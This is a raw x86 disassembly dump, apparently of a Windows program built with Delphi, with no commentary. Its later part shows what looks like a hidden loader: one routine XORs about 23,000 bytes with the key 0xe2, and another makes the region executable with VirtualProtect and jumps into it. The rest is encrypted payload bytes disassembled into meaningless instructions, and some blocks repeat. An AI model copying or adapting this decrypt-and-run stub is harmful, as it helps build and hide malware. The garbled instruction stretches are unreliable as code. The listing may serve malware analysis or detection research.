add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457c79
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40405c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d01c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40be84
mov ebx eax
inc ebx
sub_457c84
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048d8
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4579ec
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4577f4
jmp r-xdata
call sub_44deb4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458011
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40499c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_435c04
call sub_455504
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_457a24
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_4548c8
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_436cf8
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_436e9c
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4554cc
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_434478
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404004
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43850c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_457b78
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403430
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_436e70
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_436e70
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_4374f8
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_455618
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_457bd8
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_4577f4
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4577f4
jmp r-xdata
sub_458018
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fc0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_458054
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43850c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43850c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_443ca4
sub_4580e4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45810c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4581b0
add [ eax ] eax
add [ eax ] al
inc eax
std
inc ebp
add [ eax ] bl
cmp al 0x43
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45821a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44dc60
mov eax sub_44dee0
call sub_413374
mov eax [ rw-data ]
push eax
call CloseHandle
sub_458264
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
test [ ebp ] al
mov al [ 0x4583 ]
bound esp [ ecx + 0x72 ]
inc ebx
jb r-xdata
inc esp
add [ ecx + ebx * 4 + 0x41 ] ah
add [ esi + esi * 8 - 0x7afffbc ] bl
inc esp
add [ eax + 0x34 ] bh
inc eax
add [ esp + ebx + 0x31cc0045 ] bh
inc eax
add al ch
xor [ eax ] eax
mov eax 0x580044f8
out 0x43 al
add [ eax ] ch
inc [ eax + eax - 0x1c ]
cmp eax 0xfa780041
inc esp
add [ edx + edi * 8 - 0x43fffbc ] dh
inc esp
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax ] bh
add al 0x45
add [ eax - 0x6a ] cl
inc ecx
add al bl
aas
inc ebp
add [ eax ] dl
cmc
inc esp
add [ ecx + 0x43 ] ch
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] bl
add [ ebp ] eax
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add [ edx + eax ] cl
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
add al al
sti
popad
je r-xdata
inc ebp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
test [ ebp ] al
sbb [ ebx ] al
add [ eax ] al
je r-xdata
add [ fs : eax ] al
lodsb [ esi ]
add [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 + 0x45 ] dl
add [ eax + 0x4583 ] ah
add [ eax ] al
add [ eax ] eax
push es
push eax
popad
outsb
insb
xor cl [ ebx + eax ]
add [ eax ] al
add al 0x0
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] edx
add eax [ eax ]
add [ 0x614c0c00 ] al
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : ecx + esi + 0x14 ] 0x6000003
cld
add al [ eax ]
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30431
add [ ebx ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
or [ eax ] al
xor [ ebp + eax * 2 + 0x2f800 ] al
add [ eax ] al
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
mov eax eax
push esp
jne r-xdata
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
call sub_403174
mov esp ebp
pop ebp
retn
push es
push esp
inc esi
outsd
jb r-xdata
xor [ edi ] eax
add [ eax - 0x3f ] dh
inc edx
add [ edx + 0x2e700042 ] dh
inc esp
add [ eax + 0x480042b0 ] cl
insd
inc edx
add [ ebx + edi * 2 ] dh
inc edx
add [ eax + 0x4f ] bl
inc edx
add [ ebx + 0x458454c0 ] cl
add [ edi ] al
nop
xor [ ebp - 0x9 ] 0xe2
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
xor [ edx + eax * 4 - 0x3443ffbb ] ebp
inc esp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
test [ ebp ] al
pop es
inc edx
outsd
js r-xdata
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x5d42
jne r-xdata
call sub_403174
add [ ebx ] cl
push ebx
popad
jbe r-xdata
xor [ ebx + eax ] edx
add [ eax ] al
push es
or [ ebx ] al
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
jae r-xdata
mov esp ebp
pop ebp
retn
mov al [ eax ]
mov [ ebp - 0x9 ] al
nop
nop
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_403174
sub_45833a
inc esp
add [ ebx + ecx ] bl
inc ebp
add al ah
scasd [ edi ]
inc ebx
add al ah
pop ss
inc ebp
add [ eax + 0x1b ] al
inc ebp
add ah bh
sbb [ ebp ] eax
js r-xdata
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
inc ebp
add [ eax - 0x50 ] bh
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] eax
push es
push eax
popad
outsb
insb
xor cl [ ebx + eax ]
add [ eax ] al
add al 0x0
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] edx
add eax [ eax ]
add [ 0x614c0c00 ] al
bound esp [ ebp + 0x6c ]
inc ebp
imul esi [ fs : ecx + esi + 0x14 ] 0x6000003
cld
add al [ eax ]
add [ ecx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30431
add [ ebx ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
or [ eax ] al
xor [ ebp + eax * 2 + 0x2f800 ] al
add [ eax ] al
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
mov eax eax
push esp
jne r-xdata
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
call sub_403174
mov esp ebp
pop ebp
retn
push es
push esp
inc esi
outsd
jb r-xdata
xor [ edi ] eax
add [ eax - 0x3f ] dh
inc edx
add [ edx + 0x2e700042 ] dh
inc esp
add [ eax + 0x480042b0 ] cl
insd
inc edx
add [ ebx + edi * 2 ] dh
inc edx
add [ eax + 0x4f ] bl
inc edx
add [ ebx + 0x458454c0 ] cl
add [ edi ] al
nop
xor [ ebp - 0x9 ] 0xe2
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
xor [ edx + eax * 4 - 0x3443ffbb ] ebp
inc esp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
test [ ebp ] al
pop es
inc edx
outsd
js r-xdata
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x5d42
jne r-xdata
call sub_403174
add [ ebx ] cl
push ebx
popad
jbe r-xdata
xor [ ebx + eax ] edx
add [ eax ] al
push es
or [ ebx ] al
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
jae r-xdata
mov esp ebp
pop ebp
retn
mov al [ eax ]
mov [ ebp - 0x9 ] al
nop
nop
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
call sub_403174
sub_458470
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_403174
sub_4584a0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov al [ eax ]
mov [ ebp - 0x9 ] al
nop
nop
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
nop
xor [ ebp - 0x9 ] 0xe2
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
call sub_403174
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x5d42
jne r-xdata
call sub_403174
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
jae r-xdata
mov esp ebp
pop ebp
retn
sub_4584f0
push ebp
mov ebp esp
add esp 0xfffffff0
nop
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push r-xdata
call sub_4584f0
jb r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5d41
mov eax [ ebp + 0x8 ]
push eax
call VirtualProtect
nop
nop
jb r-xdata
jb r-xdata
mov [ ebp - 0x4 ] eax
nop
nop
jmp [ ebp - 0x4 ]
call sub_403174
and [ edx + 0x72 ] esi
jb r-xdata
popad
fnclex
or edx [ 0x72e2e2d2 ]
mov [ 0x6bb5b98a ] eax
jle r-xdata
jb r-xdata
loop r-xdata
0x8ae2e2b0 0xc81a
loop r-xdata
mov cl 0xff
mov ebx 0xd6c6a66b
or eax [ eax - 0x22 ]
aam 0x88
loop r-xdata
mov ecx 0x7e646bb5
jb r-xdata
loop r-xdata
loop r-xdata
dec esi
or ecx [ ecx + 0x72e2e2b0 ]
jb r-xdata
loop r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
test [ ebx ] ecx
mov al 0xb4
loop r-xdata
or bh dh
mov [ ebp - 0x1d4b4ff5 ] al
loop r-xdata
loop r-xdata
imul esp [ esi + edi * 2 - 0x1e ] 0xffffffe2
popad
and ch dl
mov dl 0xb
xor eax 0x72e2e2ba
loop r-xdata
jb r-xdata
mov ebx 0x7b1d1d7c
or edi [ edx - 0x40 ]
loop r-xdata
pop ds
sbb eax 0xbb1b21d
scasd [ edi ]
imul esp [ esi + 0x22d1a0c6 ] 0xffffffb2
mov dl 0x6f
outsb
mov dl 0xb1
outsd
adc eax 0x72e2e2d2
loop r-xdata
jb r-xdata
or esi [ ebx ]
jmp 0x72b869d8
mov eax 0xd6b76b84
mov cl 0xb
mov ecx 0x72e2e2fd
jpe r-xdata
jb r-xdata
imul esp [ edx + edi * 2 - 0x1e ] 0xffffffe2
popad
loop r-xdata
xor eax [ ebx + ebp * 2 + 0x710b5ab7 ]
stosb [ edi ]
mov dl 0xa
adc al 0xe0
mov ch 0xb1
sbb eax 0xe2e26274
sbb eax 0xe2e24e74
loop r-xdata
cmpsb [ esi ] [ edi ]
mov eax [ ebp + 0x8 ]
call sub_4584a0
mov eax [ ebp + 0x8 ]
add eax 0x3177
loop r-xdata
imul esp [ esi + 0x400bd6c6 ] 0xffffffde
outsd
scasb [ edi ]
jb r-xdata
0xb11d1d1f 0xb90b
loop r-xdata
or esp [ edi - 0x23 ]
loop r-xdata
arpl [ eax ] cx
leave
loop r-xdata
cmpsd [ esi ] [ edi ]
adc cl [ esi + 0x1de2d0d1 ]
iretd
loop r-xdata
push cs
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
loop r-xdata
scasd [ edi ]
or ecx ebx
call 0x6fb8685d
cmpsd [ esi ] [ edi ]
inc esi
or ebp [ edi + ebp * 8 - 0x1e ]
loop r-xdata
imul ecx [ esi ] 0xe6f20e63
loop r-xdata
loop r-xdata
jne r-xdata
jb r-xdata
fnstcw [ ebp * 8 - 0x1d063692 ]
loop r-xdata
and al [ edi ]
0xe2e2
jb r-xdata
loop r-xdata
fucom st2
or cl bh
or dh [ edx - 0x7 ]
pop eax
mov cl 0x6b
add ah dl
or [ ebx + 0x8 ] ah
loop r-xdata
mov ch 0xb
test [ edx - 0x478d1d1e ] esp
mov [ edi - 0x1d3f53f5 ] al
loop r-xdata
mov al ch
jb r-xdata
out 0xe2 eax
loop r-xdata
or edx [ ebx + 0x72e2e2fe ]
jb r-xdata
jb r-xdata
mov ah dl
or ecx [ ecx - 0x1e ]
loop r-xdata
loop r-xdata
jb r-xdata
insd
aad 0xe2
loop r-xdata
mov bl 0xb2
jb r-xdata
arpl [ esi ] cx
outsb
out 0xe2 al
and cl [ ebx ]
xor ebp ecx
loop r-xdata
and eax 0xd0d11aa7
loop r-xdata
loop r-xdata
mov edx 0x7272e2e2
imul esi [ ebx ] 0x5ab76b84
or esi [ ecx - 0x56 ]
mov [ eax - 0x48947b48 ] al
test [ ebx - 0x49 ] ch
salc
push edx
mov cl 0x6b
jl r-xdata
popad
imul esp [ es : esi + eax - 0x1e ] 0xffffffe2
and al 0xa7
push ss
jb r-xdata
mov ch 0xb1
sbb eax 0xe2e26274
loop r-xdata
xor [ edx - 0x1d2298f5 ] bh
mov edx 0x6b848788
cmpsd [ esi ] [ edi ]
jb r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
cwde
pop es
inc edx
loop r-xdata
mov [ edi + 0x30a76b84 ] al
mov edx 0xe2dd670b
push cs
arpl [ esi ] cx
out 0xe2 al
loop r-xdata
test [ ebx - 0x5a ] ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0xd18e12a7
shl dl 0x1
sbb eax 0x673a6931
cmp ebp ebp
loop r-xdata
mov eax [ 0xffffffffd260edfa ]
scasb [ edi ]
loop r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov ah 0xb5
or eax [ ebp + 0x72e2e2a2 ]
mov eax 0xac0b8788
popad
das
mov eax 0xaf69e2e2
push ds
or esp eax
aam 0xe2
loop r-xdata
loop r-xdata
cmpsb [ esi ] [ edi ]
xchg [ ebx + ebp * 2 + 0xbba30a7 ] eax
mov bh 0x69
test [ ecx - 0x25 ] ah
mov cl 0x1d
je r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
cmpsb [ esi ] [ edi ]
mov dl 0xb
fsubrp st5
dec esp
mov eax [ 0xffffffffa76fe2e2 ]
mov es ax
loop r-xdata
ja r-xdata
loop r-xdata
or dl [ eax ]
jb r-xdata
jb r-xdata
0xffffe2e7 0x61e2
jb r-xdata
or bl [ esp + ebp * 8 + 0x2661e2e2 ]
out dx al
imul esp [ edx + eax - 0x1e ] 0xffffffe2
loop r-xdata
inc ebx
stc
sbb eax 0xe7ea66ed
loop r-xdata
xchg edi eax
xchg ecx eax
xchg [ eax + 0x1aa72584 ] edx
rcl eax 0x1
in eax dx
cmp al 0xed
outsb
leave
stc
loop r-xdata
loop r-xdata
stosb [ edi ]
jb r-xdata
mov dl ah
sbb eax 0xe2e24e75
fucom st2
loop r-xdata
loop r-xdata
shr [ es : ecx + 0x24 ] cl
or edx [ esp + ebp * 4 - 0x1e ]
loop r-xdata
loop r-xdata
mov ecx 0x7272212b
or esp [ edi + ebp * 4 - 0x1e ]
loop r-xdata
jae r-xdata
add [ eax ] al
retn 0x2267
pushfd
in al dx
loop r-xdata
and [ edx + 0x72 ] esi
adc eax 0x67a4f297
xor [ ebx ] cl
or edx [ eax - 0x5d ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
mov cl [ eax ]
jecxz r-xdata
popad
shl dl 0xe2
jb r-xdata
xchg [ ebx ] ecx
lodsb [ esi ]
shl [ edx ] 0x1

loop r-xdata
loop r-xdata
jb r-xdata
std
loop r-xdata
0xb11d1d1f 0xb90b
mov ah [ edx ]
sbb dl ah
sbb eax 0x3a69aab4
cmp [ bp + di ] ecx
sbb dl cl
shl [ edi ] 0x1
imul esp [ esi + 0x2267c2c6 ] 0xffffffed
into
loop r-xdata
popad
out dx al
sbb eax 0xbeaa7d9
mov edx 0x72e2e2de
jb r-xdata
loop r-xdata
mov dl 0x25
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
cmpsb [ esi ] [ edi ]
loop r-xdata
or al [ ebx - 0x7 ]
loop r-xdata
loop r-xdata
add ah dl
